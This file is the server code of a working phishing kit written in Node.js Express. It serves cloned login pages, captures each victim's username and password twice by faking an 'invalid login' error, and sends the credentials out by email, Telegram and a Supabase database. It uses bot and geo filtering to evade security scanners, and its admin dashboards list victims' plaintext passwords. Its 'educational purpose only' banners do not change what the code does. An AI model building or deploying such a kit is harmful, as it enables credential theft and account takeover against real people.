const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs-extra');

// Import our custom modules
const BotMother = require('./lib/botMother.cjs');
const EmailService = require('./lib/emailService.cjs');
const TelegramService = require('./lib/telegramService.cjs');
const CredentialLogger = require('./lib/credentialLogger.cjs');
const SupabaseService = require('./lib/supabaseService.cjs');
const config = require('./config/config.cjs');

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(session({
  secret: 'phishing-kit-session',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false }
}));

// Serve static files
app.use('/Login_files', express.static('Login_files'));
app.use('/login33_files', express.static('login33_files'));

// Initialize services
const emailService = new EmailService();
const telegramService = new TelegramService();
const credentialLogger = new CredentialLogger();
const supabaseService = new SupabaseService();

// Helper function to get real IP
function getRealIP(req) {
  return req.headers['x-forwarded-for'] || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress ||
         (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
         req.ip ||
         '127.0.0.1';
}

// Bot protection middleware
async function botProtection(req, res, next) {
  const botMother = new BotMother();
  const userIP = getRealIP(req);
  const userAgent = req.headers['user-agent'] || '';
  
  botMother.setUserIP(userIP);
  botMother.setUserAgent(userAgent);
  botMother.setExitLink(config.exitLink);
  botMother.setGeoFilter(config.allowedCountries);
  botMother.setTestMode(config.testMode);
  
  // Check if bot protection is enabled
  if (config.antibot.toLowerCase() === 'yes') {
    const isAllowed = await botMother.run(config.block_proxy.toLowerCase() === 'yes');
    
    if (!isAllowed) {
      console.log(`Bot blocked: ${userIP} - ${userAgent}`);
      return res.redirect(config.exitLink);
    }
  }
  
  // Save legitimate visit
  await botMother.saveVisit();
  next();
}

// Routes
app.get('/', botProtection, async (req, res) => {
  try {
    // Serve the actual index.php content with bot protection already applied
    const indexPath = path.join(__dirname, 'index.php');
    let htmlContent = await fs.readFile(indexPath, 'utf8');
    
    // Remove PHP opening/closing tags but keep the HTML content
    htmlContent = htmlContent.replace(/<\?php[\s\S]*?\?>/g, '');
    
    res.send(htmlContent);
  } catch (error) {
    console.error('Error serving index:', error);
    res.status(500).send('Error loading page');
  }
});

app.get('/login33.htm', botProtection, async (req, res) => {
  try {
    const loginPath = path.join(__dirname, 'login33.htm');
    const htmlContent = await fs.readFile(loginPath, 'utf8');
    res.send(htmlContent);
  } catch (error) {
    console.error('Error serving login33:', error);
    res.status(500).send('Error loading page');
  }
});

// Handle first login attempt
app.post('/confirm.php', botProtection, async (req, res) => {
  const { user, pass } = req.body;
  const userIP = getRealIP(req);
  const userAgent = req.headers['user-agent'] || '';
  
  if (!user || !pass) {
    return res.redirect('/');
  }
  
  // Get country info
  const botMother = new BotMother();
  botMother.setUserIP(userIP);
  const country = await botMother.getIpInfo('countryCode');
  
  // Generate session ID if not exists
  if (!req.session.sessionId) {
    req.session.sessionId = require('crypto').randomUUID();
  }

  const credentials = {
    username: user,
    password: pass,
    attempt: 1
  };
  
  const visitorInfo = {
    ip: userIP,
    userAgent: userAgent,
    country: country
  };
  
  // Prepare data for Supabase
  const supabaseData = {
    session_id: req.session.sessionId,
    email: user,
    password: pass,
    attempt_number: 1,
    ip_address: userIP,
    country: country || 'Unknown',
    user_agent: userAgent,
    is_bot_detected: false // Could be enhanced with bot detection results
  };

  // Store first attempt in session
  req.session.firstAttempt = credentials;
  
  // Log credentials
  await credentialLogger.logCredentials(credentials, visitorInfo);
  
  // Save to Supabase
  await supabaseService.saveCredentials(supabaseData);

  // Send notifications
  await emailService.sendCredentials(credentials, visitorInfo);
  await telegramService.sendMessage(credentials, visitorInfo);
  
  console.log(`First login attempt captured: ${user} from ${userIP}`);
  
  // Redirect to "invalid login" page
  res.redirect('/login33.htm');
});

// Handle second login attempt
app.post('/confirm2.php', botProtection, async (req, res) => {
  const { user, pass } = req.body;
  const userIP = getRealIP(req);
  const userAgent = req.headers['user-agent'] || '';
  
  if (!user || !pass) {
    return res.redirect('/login33.htm');
  }
  
  // Get country info
  const botMother = new BotMother();
  botMother.setUserIP(userIP);
  const country = await botMother.getIpInfo('countryCode');
  
  // Use existing session ID or create new one
  if (!req.session.sessionId) {
    req.session.sessionId = require('crypto').randomUUID();
  }
  const credentials = {
    username: user,
    password: pass,
    attempt: 2
  };
  
  const visitorInfo = {
    ip: userIP,
    userAgent: userAgent,
    country: country
  };
  
  // Prepare data for Supabase
  const supabaseData = {
    session_id: req.session.sessionId,
    email: user,
    password: pass,
    attempt_number: 2,
    ip_address: userIP,
    country: country || 'Unknown',
    user_agent: userAgent,
    is_bot_detected: false
  };

  // Log second attempt
  await credentialLogger.logCredentials(credentials, visitorInfo);
  
  // Save to Supabase
  await supabaseService.saveCredentials(supabaseData);

  // Send notifications for second attempt
  await emailService.sendCredentials(credentials, visitorInfo);
  await telegramService.sendMessage(credentials, visitorInfo);
  
  console.log(`Second login attempt captured: ${user} from ${userIP}`);
  
  // Clear session
  req.session.destroy();
  
  // Redirect to final page
  res.redirect('/link.php');
});

app.get('/link.php', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
       <meta http-equiv="refresh" content="2; url=${config.exitLink}">
       <title>Redirecting...</title>
    </head>
    <body>
      <p>Redirecting to your email...</p>
    </body>
    </html>
  `);
});

// Admin panel to view Supabase data
app.get('/admin/database', async (req, res) => {
  try {
    const credentials = await supabaseService.getAllCredentials(50);
    const stats = await supabaseService.getStatistics();
    
    let html = `
      <html>
      <head>
        <title>Database Dashboard - Educational Purpose</title>
        <style>
          body { font-family: Arial, sans-serif; margin: 20px; }
          .stats { background: #f5f5f5; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
          .stats div { display: inline-block; margin-right: 30px; }
          table { border-collapse: collapse; width: 100%; }
          th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
          th { background-color: #f2f2f2; }
          .attempt-1 { background-color: #ffe6e6; }
          .attempt-2 { background-color: #e6ffe6; }
        </style>
      </head>
      <body>
        <h1>⚠️ EDUCATIONAL PURPOSE ONLY ⚠️</h1>
        <h2>Database Dashboard</h2>`;
    
    if (stats) {
      html += `
        <div class="stats">
          <div><strong>Total Attempts:</strong> ${stats.totalAttempts}</div>
          <div><strong>Unique Victims:</strong> ${stats.uniqueVictims}</div>
          <div><strong>Countries:</strong> ${stats.countriesTargeted}</div>
        </div>`;
    }
    
    html += `
        <h3>Recent Captures</h3>
        <table>
          <tr>
            <th>Timestamp</th>
            <th>Session</th>
            <th>Attempt</th>
            <th>Email</th>
            <th>Password</th>
            <th>IP</th>
            <th>Country</th>
          </tr>`;
    
    credentials.forEach(cred => {
      const attemptClass = cred.attempt_number === 1 ? 'attempt-1' : 'attempt-2';
      html += `
          <tr class="${attemptClass}">
            <td>${new Date(cred.created_at).toLocaleString()}</td>
            <td>${cred.session_id.substring(0, 8)}...</td>
            <td>${cred.attempt_number}</td>
            <td>${cred.email}</td>
            <td>${cred.password}</td>
            <td>${cred.ip_address}</td>
            <td>${cred.country}</td>
          </tr>`;
    });
    
    html += `
        </table>
        <p><strong>Note:</strong> This is for cybersecurity education and research only.</p>
        <p><a href="/admin/credentials">View File Logs</a></p>
      </body>
      </html>`;
    
    res.send(html);
  } catch (error) {
    res.status(500).send('Error retrieving database data: ' + error.message);
  }
});

// Admin panel to view captured credentials (for educational purposes)
app.get('/admin/credentials', async (req, res) => {
  try {
    const credentials = await credentialLogger.getCredentials();
    res.send(`
      <html>
      <head><title>Captured Credentials - Educational Purpose</title></head>
      <body>
        <h1>⚠️ EDUCATIONAL PURPOSE ONLY ⚠️</h1>
        <h2>Captured Credentials</h2>
        <pre style="background: #f5f5f5; padding: 20px; border-radius: 5px;">
${credentials}
        </pre>
        <p><strong>Note:</strong> This is for cybersecurity education and research only.</p>
        <p><a href="/admin/database">View Database Dashboard</a></p>
      </body>
      </html>
    `);
  } catch (error) {
    res.status(500).send('Error retrieving credentials');
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'running',
    antibot: config.antibot,
    block_proxy: config.block_proxy,
    test_mode: config.testMode,
    timestamp: new Date().toISOString()
  });
});

app.listen(port, () => {
  console.log(`🎯 Phishing Kit Server running at http://localhost:${port}`);
  console.log(`📊 Admin panel: http://localhost:${port}/admin/credentials`);
  console.log(`🗄️  Database dashboard: http://localhost:${port}/admin/database`);
  console.log(`⚠️  FOR EDUCATIONAL/RESEARCH PURPOSES ONLY`);
  console.log(`🔧 Configuration:`);
  console.log(`   - Anti-bot: ${config.antibot}`);
  console.log(`   - Block proxy: ${config.block_proxy}`);
  console.log(`   - Test mode: ${config.testMode}`);
  console.log(`   - Email configured: ${config.email.smtp.auth.user ? 'Yes' : 'No'}`);
  console.log(`   - Telegram configured: ${config.telegram.botToken ? 'Yes' : 'No'}`);
  console.log(`   - Supabase configured: ${process.env.SUPABASE_URL ? 'Yes' : 'No'}`);
});